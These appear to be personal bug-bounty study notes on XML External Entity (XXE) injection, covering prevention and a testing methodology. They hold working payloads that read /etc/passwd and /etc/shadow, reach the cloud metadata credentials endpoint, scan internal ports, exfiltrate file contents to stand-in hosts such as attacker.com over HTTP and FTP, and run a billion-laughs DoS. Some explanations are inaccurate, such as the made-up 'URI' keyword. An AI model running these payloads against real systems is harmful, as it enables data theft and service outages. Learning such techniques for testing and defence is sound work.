
### what & why
> vulnerabilities that target the XML parsers of an application. XXEs can be very impactful bugs, as they can lead to confidential [[Information Disclosure]], [[SSRF]],  ,and [[DoS]] attacks
#### XML
> XML stands for *Extensible Markup Language*, and it is a markup language used to store and transport data in a structured format.
> XML is designed to be self-describing, meaning that it contains tags that describe the data they contain, and these tags can be customized to fit specific needs.
> > u can use any naming u wise for elements as long as u follow:
> > 1. name must start with a letter `[A-Za-z]` or underscore `_` and not with `xml` string
> > 2. names are case sensitive
> > 3. names can contain letters, digits, no space
> 
> > elements can have attributes such `key="value"` which only define in start tag ,The "id" attribute is used to uniquely identify an element within an XML document.
> 
> file structure:
> - xml declaration: `<?xml version="1.0" encoding="UTF-8"?>`
>     - The first part of the XML declaration, "version="1.0"", indicates the version of XML being used.
>     - The second part of the XML declaration, "encoding="UTF-8"", indicates the character encoding used in the document
> - then there are root tag such as `<catalog>` that have childes , sub-childes. a childe can have sub-childes or just text
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <catalog>
>   <book id="bk101">
>     <author>Gambardella, Matthew</author>
>     <title>XML Developer's Guide</title>
>     <genre>Computer</genre>
>     <price>44.95</price>
>     <publish_date>2000-10-01</publish_date>
>     <description>An in-depth look at creating applications with XML.</description>
>   </book>
>   <book id="bk102">
>     <author>Ralls, Kim</author>
>     <title>Midnight Rain</title>
>     <genre>Fantasy</genre>
>     <price>5.95</price>
>     <publish_date>2000-12-16</publish_date>
>     <description>A former architect battles corporate zombies, an evil sorceress, 
> 			and her own childhood to become queen of the world.</description>
>   </book>
> </catalog>
> ```
> web applications commonly use XML to transport identity information in Security Assertion Markup Language (SAML) authentication, file transfers, and image uploads

#### Entity
> but what about if we have special string(`&,<,>,',"`) or wide used, are we gonna write it over again and again ? no we use XML Entity.
##### XML Entities Types
There are two types of entities in XML character entities and parameter entities. 
1. Character entities are used to represent individual characters or symbols.
   `<name> my name is &lt; MRT &gt; <name>`
 2. parameter entities are used to define reusable blocks of text or markup.
```xml
<!DOCTYPE book [
  <!ENTITY author "devMRT">
]>
<book>
  <author>&author;</author>
  <title>XML Developer's Guide</title>
  <genre>Computer</genre>
  <price>44.95</price>
  <publish_date>2000-10-01</publish_date>
</book>
 ```
 > In this example, a parameter entity named "author" is defined in the **document type declaration (DTD)** at the top of the document. The entity is defined to contain the text "devMRT". Later in the document, the entity is referenced using the syntax "&author;", the XML document will load the value of file in its place
##### DTDs types
DTDs can be loaded from *external sources* or *declared in the document* itself within a `DOCTYPE` tag, there are several ways to define external entities. 
Here are the most common types of ***external entity*** declarations:
> 1. SYSTEM: The SYSTEM keyword is used to specify the location of the external entity in a local or remote file system.
>     ```xml
>     <!DOCTYPE example [
>       <!ENTITY text SYSTEM "text.txt">
>     	**<!ENTITY localfile SYSTEM "file:///C:/path/to/local/file.txt">
>     	<!ENTITY external SYSTEM "<http://example.com/external.xml>">
>     	<!ENTITY evil SYSTEM "file:///etc/passwd">**
>     	**<!ENTITY ftpconn SYSTEM "ftp:///etc/passwd">**
>     ]>
>     ```
> 2. PUBLIC: The PUBLIC keyword is used to specify a public identifier for the external entity. This identifier can be used to retrieve the entity from a catalog of public entities, which can be useful when working with multiple XML documents that use the same external entities. (ew can use Entities defined in anther file) For example:
>     ```xml
>     <!DOCTYPE example [
>       <!ENTITY text PUBLIC "-//Example//EN" "text.txt">
>     ]>
>     ```
> 3. URI: The URI keyword is used to specify the location of the external entity using a URI (Uniform Resource Identifier). This can be useful when the external entity is located on a remote web server or other network resource. For example:
>     ```xml
>     <!DOCTYPE example [
>       <!ENTITY text URI "<http://example.com/text.txt>">
>     ]>
>     ```

*What’s the vulnerability hidden within this functionality? The issue is that if users can control the values of XML entities or external entities, they might be able to disclose internal files, port-scan internal machines, or launch DoS attacks.*
### Prevention
> - **Disable XML external entity and DTD processing** in all XML parsers in the application, as per the [OWASP Cheat Sheet ‘XXE Prevention’](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
> - Implement positive (“whitelisting”) server-side input validation, filtering, or sanitization to prevent hostile data within XML documents, headers, or nodes
> - prevent XXE-based DoS, you can limit the XML parser’s parse time and parse depth
> - disallow outbound network traffic to prevent Blind XXE(having the target server make an outbound request with the stolen data)
> - Whenever possible, use less complex data formats such as JSON, and avoiding serialization of sensitive data.
> - Patch or upgrade all XML processors and libraries in use by the application or on the underlying operating system. Use dependency checkers. Update SOAP to SOAP 1.2 or higher.
### hunt for it
1. Find **XML Data Entry Points**
	- browse the app function and find these XML entry points by decoding any blocks of data that look suspicious, search for `"<?xml"` or base64 `LD94bWw`, url-encode `%3C%3Fxml` 
	- you should also look for [[file upload]] features because XML forms the basis of many XML file types. If you can upload one of these file types (XML, HTML, DOCX, PPTX, XLSX, GPX, PDF, SVG, RSS feeds, metadata embedded within images like GIF, PNG, JPEG), you might be able to smuggle XML input to the application’s XML parser. SOAP web services are also XML based
	- In addition to looking for locations where the application accepts XML data by default, you can try to force the application into parsing XML data. send xml to endpoints take plaintext or JSON and change `Content-Type: text/xml` or `Content-Type: application/xml`
	- some applications receive user-submitted data and embed it into an XML document on the server side, you can submit an `XInclude` test payload to the endpoint
2.  test for **Classic XXE** by sending a few trial-and-error XXE payloads and observing the application’s response. 
	1. start by tests if DTD allowed or not
	```xml
	<?xml version="1.0" encoding="UTF-8"?> 
	<!DOCTYPE example [ <!ENTITY test SYSTEM "Hello!"> ]> 
	<example>&test;</example>
	```
	2. try to get common files `/etc/hostname `, `~/.bash_history`
	 ```xml
	 <?xml version="1.0" encoding="ISO-8859-1"?>
	 <!DOCTYPE root [ <!ENTITY file SYSTEM "file:///etc/passwd"> ]>
	 <root>&file;</root>
	 ```
	 3. if `SYSTEM` not allowed try `PUBLIC` with random `id`
	```xml
	 <?xml version="1.0" encoding="UTF-8"?> 
	 <!DOCTYPE example [ <!ENTITY test PUBLIC "abc" "file:///etc/hostname"> ]> <example>&test;</example>
	```
	don’t give up if the first few files you try to read do not display
3. Test for **Blind XXE**: If the server takes XML input but does not return the XML document in an HTTP response, first test if the server can make outbound connection, check your server logs.
   if u see the request then try Data Exfiltration from Escalating the Attack point
	```xml
	<?xml version="1.0" encoding="UTF-8"?> 
	<!DOCTYPE example [ <!ENTITY test SYSTEM "http://attacker_server:80/xxe_test.txt"> ]> <example>&test;</example>
	```
1. Embed XXE Payloads in Different File Types, cuz most of the time File-upload endpoints and file parsers not protected by the same XXE protection mechanisms more on [[File Upload]]
2. Test for XInclude Attacks, when you cannot control the entire XML document or edit the DTD of an XML document. but the application takes your input and inserts it into XML documents on the backend.
   *XInclude* is a special XML feature that builds a separate XML document from a single XML tag named `xi:include`
	```xml
	<foo xmlns:xi="http://www.w3.org/2001/XInclude"> 
	<xi:include parse="text" href="file:///etc/passwd"/></foo>
	```
#### Escalating the Attack
What you can achieve with an XXE vulnerability depends on the permissions given to the XML parser
-  [[file Inclusion]] use `file` entity to access and exfiltrate system files, source code, and directory listings
- [[SSRF]] to pull instance metadata, port scanning
	```xml
	<?xml version="1.0" encoding="UTF-8"?> 
	<!DOCTYPE example [ 
	<!ENTITY file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> 
	<!ENTITY portScan SYSTEM "http://10.0.0.1:80">
	]> 
	<example>&file;</example>
	<scan>&portScan;</scan>	
	```
- Blind XXE
	to exfiltrate data via a blind XXE, you have to host an external DTD on your server. Try hosting a file named xxe.dtd on your server:
	```xml
	<!ENTITY % file SYSTEM "file:///etc/shadow"> 
	<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?%file;'>"> 
	%ent; 
	%exfiltrate;
	```
	or 
	```xml
	<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow"> <!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?%file;'>"> 
	%ent; 
	%exfiltrate;
	```
	Then make the target parser interpret your DTD by specifying it within a parameter entity and referencing that entity: 
	```xml
	<?xml version="1.0" encoding="UTF-8"?> 
	<!DOCTYPE example [ 
		<!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd"> 
		%xxe; 
	]>
	```
- [[DoS]]  using `billion laughs attack ` 
```xml
	<?xml version="1.0" encoding="UTF-8"?> 
	<!DOCTYPE example [ 
		<!ELEMENT example ANY> 
		<!ENTITY lol "lol"> 
		<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> 
		<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> 
		<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> 
		<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> 
		<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> 
		<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> 
		<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> 
		<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> 
		<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> 
	]>
	<example>&lol9;</example>
```
> 	**Note that you should never try this on a live target! Testing for DoS on a live target can cause the organization financial loss and is usually against companies’ bug bounty policies**

> 	This payload embeds entities within entities, causing the XML parser to recursively dereference entities to get to the root entity value lol, a single `lol9` will be expanded into one billion `lol`
- Data Exfiltration 
```xml
<!ENTITY % file SYSTEM "file:///passwords.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate 'http://attacker_server/?%start;%file;%end;'>">
 %ent; 
 %exfiltrate;
```
send files using ftp ,  here's [simple Ruby ftp server script](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)
```xml
<!ENTITY % file SYSTEM "file:///etc/shadow"> 
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://attck.com:2121/?%file;'>"> 
%ent; 
%exfiltrate;
```
### resources
[https://github.com/payloadbox/xxe-injection-payload-list](https://github.com/payloadbox/xxe-injection-payload-list) [](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE) Injection

